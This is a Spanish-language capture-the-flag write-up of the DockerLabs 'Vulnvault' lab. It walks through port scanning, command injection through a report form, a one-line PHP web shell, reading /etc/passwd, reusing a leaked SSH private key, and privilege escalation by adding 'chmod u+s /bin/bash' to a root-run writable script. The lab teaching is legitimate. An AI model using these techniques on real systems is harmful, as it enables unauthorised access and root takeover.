---
title: DockerLabs - Vulnvault
summary: "Write-up del laboratorio Vulnvault de DockerLabs"
author: elcybercurioso
date: 2025-11-04
categories: [Post, DockerLabs]
tags: [fácil, rce, ssh, process snooping, privesc]
media_subpath: "/assets/img/posts/dockerlabs_vulnvault"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ nmap -sCV -p22,80 172.17.0.2                                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Generador de Reportes - Centro de Operaciones
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Comenzamos revisando la pagina principal, en la que nos encontramos un panel que tiene varias funcionalidades, entre la cuales podemos destacar el generar un report, y subir ficheros:

![Desktop View](/20251102165435.webp){: width="972" height="589" .shadow}

Dejamos corriendo por detrás a `gobuster` revisando recursos existentes en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.txt,.html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3494]
/upload.php           (Status: 200) [Size: 33]
/upload.html          (Status: 200) [Size: 2314]
/old                  (Status: 301) [Size: 306] [--> http://172.17.0.2/old/]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que en el recurso `/old` encontramos una versión que no tiene estilo, pero nada que nos ayude a acceder al laboratorio:

![Desktop View](/20251102185748.webp){: width="972" height="589" .shadow}

Y el recurso `/upload` es el que se emplea en la funcionalidad de subir ficheros que revisaremos mas adelante, el cual nos indica que no hemos indicado un fichero:

![Desktop View](/20251102185941.webp){: width="972" height="589" .shadow}

Revisamos la funcionalidad de generar reportes, donde se ve reflejado lo que introducimos en los campos del anterior formulario:

![Desktop View](/20251102170228.webp){: width="972" height="589" .shadow}

El contenido reflejado en la respuesta anterior es el que se encuentra en el documento de texto que nos indican:

![Desktop View](/20251102172617.webp){: width="972" height="589" .shadow}

Siguiendo con el análisis, revisamos la funcionalidad de subida de ficheros, por si podríamos llegar a subir algún fichero malicioso, como una reverse shell:

![Desktop View](/20251102172355.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Tratamos de subir un fichero que nos permita ejecutar comandos remotamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ cat shell.php           
<?php
        system($_GET['cmd']);
?>
```

Y parecería que se está subiendo correctamente:

![Desktop View](/20251102172536.webp){: width="972" height="589" .shadow}

Sin embargo, no recibimos la ruta en la que se estaría subiendo; interceptando la petición, vemos que de hecho, está fallando:

![Desktop View](/20251102182206.webp){: width="972" height="589" .shadow}

Haciendo pruebas con el formulario de la generación de reportes, nos damos cuenta de que podemos llegar a ejecutar comandos si indicamos un `;` y luego un comando, ya que con esto lo que logramos es inyectar un comando. Este se va a concatenar al que ya se está empleando para tratar el texto introducido (esto ocurre siempre y cuando el input no se esté sanitizando correctamente):

![Desktop View](/20251102182348.webp){: width="972" height="589" .shadow}

En la respuesta observamos que se ve reflejado el resultado del comando inyectado:

![Desktop View](/20251102182727.webp){: width="972" height="589" .shadow}

>Normalmente, en este momento, la idea sería conseguir una consola interactiva en la máquina, pero en mi caso he optado por seguir usando la página web para ejecutar comandos, lo cual es menos recomendable, ya que tenemos menos movilidad.
{: .prompt-warning }

## movimiento lateral (samara)

Pudiendo ya ejecutar comandos de forma remota, obtenemos los usuarios del sistema mediante la lectura del fichero `/etc/passwd`:

![Desktop View](/20251102182900.webp){: width="972" height="589" .shadow}

Encontramos que el usuario con bajos privilegios es `samara`, por lo que comprobamos que ficheros tiene en el directorio principal:

![Desktop View](/20251102182935.webp){: width="972" height="589" .shadow}

Leemos los ficheros en caso de que haya algo que nos de acceso a la máquina:

![Desktop View](/20251102183020.webp){: width="972" height="589" .shadow}

Al ir a revisar la carpeta `.ssh`, vemos que el fichero `id_rsa` se encuentra disponible, y los permisos indican que todo usuario puede leerlo:

![Desktop View](/20251102183059.webp){: width="972" height="589" .shadow}

Mostramos el contenido por pantalla del fichero `id_rsa`:

![Desktop View](/20251102183150.webp){: width="972" height="589" .shadow}

Lo guardamos en un fichero, le damos permisos `600` (lectura y escritura únicamente para el propietario del fichero), y nos conectamos como el usuario `samara`, ya que al pertenecer a dicho usuario, no nos pedirá la contraseña para acceder por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ chmod 600 id_rsa   
                                                                                                                                                                                                  
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ ssh -i id_rsa samara@172.17.0.2
samara@8d57fdfa7175:~$ whoami
samara
samara@8d57fdfa7175:~$ hostname -I
172.17.0.2
```

Una vez dentro, vemos que ahora podemos leer el contenido del fichero `user.txt`:

```bash
samara@8d57fdfa7175:~$ ls
message.txt  user.txt
samara@8d57fdfa7175:~$ cat user.txt 
030208**************************
```

## escalada de privilegios (root)

Tras revisar permisos SUDO y SUID, vemos que no van los tiros por ahí, por lo que revisamos los ficheros sobre los cuales tenemos permisos de escritura, donde vemos uno que llama la atención (`/usr/local/bin/echo.sh`):

```bash
samara@8d57fdfa7175:~$ find / -writable 2>/dev/null | grep -vE "/proc|/dev|/var|/run"
/home/samara
/home/samara/user.txt
/home/samara/.bash_history
/home/samara/.local
/home/samara/.local/share
/home/samara/.local/share/nano
/home/samara/.cache
/home/samara/.cache/motd.legal-displayed
/home/samara/.profile
/home/samara/.ssh
/home/samara/.ssh/id_rsa
/home/samara/.ssh/id_rsa.pub
/home/samara/.bash_logout
/home/samara/.bashrc
/etc/systemd/system-generators/systemd-gpt-auto-generator
/usr/local/bin
/usr/local/bin/echo.sh
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/cryptdisks-early.service
/usr/lib/systemd/system/x11-common.service
/usr/lib/systemd/system/cryptdisks.service
/tmp
```

Lo revisamos para ver cual es su contenido, el cual nos confirma que se trata de un script en `bash`:

```bash
samara@8d57fdfa7175:~$ cat /usr/local/bin/echo.sh
#!/bin/bash

echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
```

Comprobamos los permisos que tiene, y vemos que podríamos llegar a modificarlo:

```bash
samara@8d57fdfa7175:~$ ls -la /usr/local/bin/echo.sh
-rwxrw-rw- 1 root root 82 Aug 20  2024 /usr/local/bin/echo.sh
```

Debido a que es posible que haya una tarea cron que está ejecutando este script a intervalos regulares de tiempo, vamos a emplear `pspy` ([GitHub](https://github.com/DominicBreuker/pspy)) para ver los procesos que se ejecutan en el sistema:

![Desktop View](/20251102184442.webp){: width="972" height="589" .shadow}

Lo subimos a la carpeta `/tmp` de maquina empleando `scp`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Vulnvault]
└─$ scp -i id_rsa pspy64 samara@172.17.0.2:/tmp    
pspy64                                                                                                                                                                          100% 3032KB  58.5MB/s   00:00
```

Le damos permisos de ejecución, lo ejecutamos, e inmediatamente nos daremos cuenta de que cada segundo se ejecuta el script que hemos visto:

```bash
CMD: UID=0     PID=828573 | chmod u+s /bin/bash 
CMD: UID=0     PID=828574 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828575 | /bin/bash /usr/local/bin/echo.sh 
CMD: UID=0     PID=828576 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828577 | 
CMD: UID=0     PID=828578 | 
CMD: UID=0     PID=828579 | /bin/bash /usr/local/bin/echo.sh 
CMD: UID=0     PID=828580 | /bin/bash /usr/local/bin/echo.sh 
CMD: UID=0     PID=828581 | chmod u+s /bin/bash 
CMD: UID=0     PID=828582 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828583 | 
CMD: UID=0     PID=828584 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828585 | chmod u+s /bin/bash 
CMD: UID=0     PID=828586 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828587 | 
CMD: UID=0     PID=828588 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
CMD: UID=0     PID=828589 | /bin/bash /usr/local/bin/echo.sh 
CMD: UID=0     PID=828590 | 
CMD: UID=0     PID=828591 | /bin/bash /usr/local/bin/echo.sh 
CMD: UID=0     PID=828592 | /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done 
```

Revisando los tiempos de creación nos indica que el fichero `message.txt` se está continuamente sobreescribiendo:

```bash
samara@8d57fdfa7175:~$ ls -la message.txt 
-rw-r--r-- 1 root root 0 Nov  2 18:40 message.txt
samara@8d57fdfa7175:~$ ls -la message.txt 
-rw-r--r-- 1 root root 35 Nov  2 18:41 message.txt
```

Con esto llegamos a la conclusión de que podemos llegar a ejecutar comandos como el usuario `root`, ya que lo que indiquemos en el script `echo.sh` se ejecutará con los permisos del usuario `root` cada segundo:

```bash
samara@8d57fdfa7175:~$ cat /usr/local/bin/echo.sh
#!/bin/bash

echo "No tienes permitido estar aqui :(." > /home/samara/message.txt

chmod u+s /bin/bash
samara@8d57fdfa7175:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Para este caso, hemos empleado el método de cambiar los permisos del binario `/bin/bash` para que sea SUID, y así poder invocar una consola privilegiada:

```bash
samara@8d57fdfa7175:/tmp$ bash -p
bash-5.2# whoami
root
```

La flag del usuario `root`:

```bash
bash-5.2# cat root.txt 
640c89**************************
```

Y con esto habremos concluido la resolución del laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>